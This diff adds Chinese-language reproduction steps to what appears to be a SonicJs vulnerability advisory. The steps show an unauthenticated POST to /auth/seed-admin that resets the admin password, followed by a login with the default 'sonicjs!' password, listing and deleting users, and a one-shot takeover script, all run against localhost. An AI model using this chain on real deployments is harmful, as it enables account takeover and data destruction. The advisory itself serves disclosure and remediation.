@@ -127,6 +127,167 @@ authRoutes.post('/seed-admin', async (c) => {
 })
 ```
 
+## 本地复现步骤（手把手）
+
+> 前置条件：参考 [sonicjs-local-setup.md](sonicjs-local-setup.md) 完成环境搭建。
+
+### 1. 搭建环境
+
+```bash
+# 克隆并安装
+git clone https://github.com/SonicJs-Org/sonicjs.git
+cd sonicjs
+npm install
+npm run build:core
+
+# 初始化本地数据库
+cd my-sonicjs-app
+npx wrangler d1 migrations apply DB --local
+
+# 启动服务
+npx wrangler dev
+# 服务运行在 http://localhost:8787
+```
+
+### 2. 模拟「已有管理员」的正常场景
+
+```bash
+# 先通过正常注册流程创建第一个 admin 用户
+curl -s -X POST http://localhost:8787/auth/register \
+  -H "Content-Type: application/json" \
+  -d '{
+    "email": "real-admin@company.com",
+    "password": "MyStr0ngP@ss!",
+    "username": "realadmin",
+    "firstName": "Real",
+    "lastName": "Admin"
+  }'
+
+# 确认能正常登录
+curl -s -X POST http://localhost:8787/auth/login \
+  -H "Content-Type: application/json" \
+  -d '{"email":"real-admin@company.com","password":"MyStr0ngP@ss!"}'
+# 应返回 token
+```
+
+### 3. 执行攻击：调用 seed-admin
+
+```bash
+# 以「未认证攻击者」身份，直接 POST seed-admin
+# 注意：无需任何 token 或 cookie
+curl -s -X POST http://localhost:8787/auth/seed-admin | python3 -m json.tool
+```
+
+**预期输出（场景A - admin@sonicjs.com 不存在）**：
+```json
+{
+  "message": "Admin user created successfully",
+  "user": {
+    "id": "admin-user-id",
+    "email": "admin@sonicjs.com",
+    "username": "admin",
+    "role": "admin"
+  },
+  "passwordHash": "pbkdf2:100000:..."
+}
+```
+
+**预期输出（场景B - admin@sonicjs.com 已存在）**：
+```json
+{
+  "message": "Admin user already exists (password updated)",
+  "user": {
+    "id": "admin-user-id",
+    "email": "admin@sonicjs.com",
+    "username": "admin",
+    "role": "admin"
+  }
+}
+```
+
+### 4. 用已知密码登录 admin
+
+```bash
+curl -s -X POST http://localhost:8787/auth/login \
+  -H "Content-Type: application/json" \
+  -d '{"email":"admin@sonicjs.com","password":"sonicjs!"}' | python3 -m json.tool
+```
+
+**预期输出**：
+```json
+{
+  "user": {
+    "id": "admin-user-id",
+    "email": "admin@sonicjs.com",
+    "username": "admin",
+    "firstName": "Admin",
+    "lastName": "User",
+    "role": "admin"
+  },
+  "token": "eyJhbGciOiJIUzI1NiJ9..."
+}
+```
+
+### 5. 以 admin 身份访问后台
+
+```bash
+# 用上一步拿到的 token
+TOKEN="eyJhbGciOiJIUzI1NiJ9..."
+
+# 访问管理面板 API
+curl -s -H "Authorization: Bearer $TOKEN" \
+  http://localhost:8787/api/system/health | python3 -m json.tool
+
+# 列出所有用户
+curl -s -H "Authorization: Bearer $TOKEN" \
+  http://localhost:8787/admin/users
+
+# 删除其他用户（完全接管）
+curl -s -X DELETE -H "Authorization: Bearer $TOKEN" \
+  http://localhost:8787/api/users/<real-admin-user-id>
+```
+
+### 6. 验证完整攻击链
+
+```bash
+# 一键脚本：从零到 admin
+echo "=== Step 1: Seed admin ==="
+curl -s -X POST http://localhost:8787/auth/seed-admin
+
+echo ""
+echo "=== Step 2: Login as admin ==="
+RESPONSE=$(curl -s -X POST http://localhost:8787/auth/login \
+  -H "Content-Type: application/json" \
+  -d '{"email":"admin@sonicjs.com","password":"sonicjs!"}')
+echo $RESPONSE | python3 -m json.tool
+
+TOKEN=$(echo $RESPONSE | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")
+
+echo ""
+echo "=== Step 3: Verify admin access ==="
+curl -s -H "Authorization: Bearer $TOKEN" \
+  http://localhost:8787/auth/me | python3 -m json.tool
+
+echo ""
+echo "=== ATTACK COMPLETE: Full admin access obtained without any credentials ==="
+```
+
+### 7. 数据库验证
+
+```bash
+# 查看数据库中的 admin 用户（确认密码被重置）
+npx wrangler d1 execute DB --local \
+  --command="SELECT id, email, username, role, created_at FROM users WHERE email='admin@sonicjs.com';"
+```
+
+### 关键观察点
+
+- `/auth/seed-admin` 没有检查 `ENVIRONMENT` 变量
+- 没有 `requireAuth()` 中间件保护
+- rate limit 为 10次/分钟，但攻击只需要 1 次
+- 如果 admin 已存在，密码会被**无条件重置**
+- 攻击者可以在任何公开部署的 SonicJs 实例上执行此操作
+
 ## 时间线
 
 | 日期 | 事件 |
